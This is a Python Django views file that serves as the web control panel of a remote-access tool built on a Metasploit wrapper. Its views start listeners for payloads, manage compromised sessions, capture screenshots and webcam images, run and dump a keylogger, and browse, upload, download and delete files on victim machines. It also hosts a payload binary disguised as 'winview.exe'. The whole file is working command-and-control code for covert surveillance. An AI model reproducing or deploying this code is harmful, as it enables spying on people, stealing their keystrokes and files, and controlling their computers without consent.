# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from django.http import HttpResponse, JsonResponse
import urllib
from django.shortcuts import render, redirect
from core.MsfToolbox import *
from datetime import datetime
from django.core.files.storage import FileSystemStorage
import anssi.settings



import time
# Create your views here.

# Global
toolbox = MsfToolbox()


def init_worker(request):
	lport = request.GET.get('lport', None)
	payload = request.GET.get('payload', None)
	toolbox.exploit_multi_handler(lport, payload)
	return JsonResponse({'init':True}) 

def init(request):
	return render(request, 'server/init.html')


def jobs(request):
	jobs = toolbox.get_jobs()
	return render(request, 'server/jobs.html', {'jobs': jobs, 'jobs_nbr': len(jobs)})

def jobs_kill(request, id):
	toolbox.kill_job(id)
	return redirect('jobs')

def home(request):
    return render(request, 'server/home.html')


def sessions(request):
	sessions = toolbox.get_sessions()
	return render(request, 'server/sessions.html', {'sessions': sessions, 'sessions_nbr': len(sessions)})


def session(request, id):
	return redirect('session_information', id)


def session_information(request, id):
	sysinfo = toolbox.get_sysinfo(int(id))
	return render(request, 'server/session_information.html', {'id': int(id), 'infos': sysinfo })

def session_close(request, id):
	toolbox.session_close(int(id))
	return redirect('sessions')

def action_screenshot(request, id):
	toolbox.post_take_screenshot(session=int(id))
	return redirect(session_screenshot, id)


def session_screenshot(request, id):
	images = toolbox.get_screenshots_url()
	return render(request, 'server/session_screenshot.html', {'id': int(id), 'images': images})



def action_webcam(request, id):
	toolbox.post_take_snapshot(session=int(id))
	return redirect(session_webcam, id)
        

def session_webcam(request, id):
	images = toolbox.get_snapshots_url()
	return render(request, 'server/session_webcam.html', {'id': int(id), 'images': images})


def session_live(request, id):
	return render(request, 'server/session_live.html', {'id': int(id)})


def session_explorer(request, id):
	shell = toolbox.get_session_shell(int(id))

	path = request.GET.get('path')
	ftype = request.GET.get('type')
	delete = request.GET.get('delete', None)
	upload = request.FILES.get('file', None)

	uploaded = False 
	if (upload != None):
		uploaded = toolbox.upload(shell, upload)

	if path != None and ftype == 'dir' and delete == None:
		toolbox.cd(shell, path)
		return redirect('session_explorer', id)
	elif path != None and ftype == 'dir':
		toolbox.rmdir(shell, path)
	elif path != None and ftype == 'fil' and delete == None:
		return toolbox.download(shell, path)
	elif path != None and delete:
		toolbox.rm(shell, path)

	(pwd, files, error) = toolbox.ls(shell)

	#toolbox.add_routing_files(files)


	return render(request, 'server/session_explorer.html', {'id': int(id), 'files': files, 'pwd': pwd, 'ls_error': error, 'have_uploaded': upload != None, 'have_uploaded_successfully': uploaded})

def upload_payload(request):
	payload_link = '/media/payload/winview.exe'
	payload_file = os.path.join(anssi.settings.MEDIA_ROOT, 'payload', 'winview.exe')
	payload_exists = False 

	if os.path.exists(payload_file):
		payload_exists = True

	uploaded = False

	if request.method == 'POST':
		uploaded_file = request.FILES.get('payload_binary', None)

		fs = FileSystemStorage()

		if payload_exists:
			fs.delete(payload_file)

		filename = fs.save('payload/winview.exe', uploaded_file)
		uploaded = True

	return render(request, 'server/payload.html', {'uploaded': uploaded, 'link': payload_link, 'exists': payload_exists})


def session_keylogger(request, id):
	enabled = False 

	if request.GET.get('action') == 'start':
		toolbox.start_keylogger(int(id))
		enabled = True 
	elif request.GET.get('action') == 'stop':
		toolbox.stop_keylogger(int(id))
		enabled = False 
	elif request.GET.get('action') == 'retrieve':
		value = toolbox.dump_keylogger(int(id))
		return JsonResponse({'value': value})
	
	return render(request, 'server/session_keylogger.html', {'id': int(id), 'enabled': enabled})

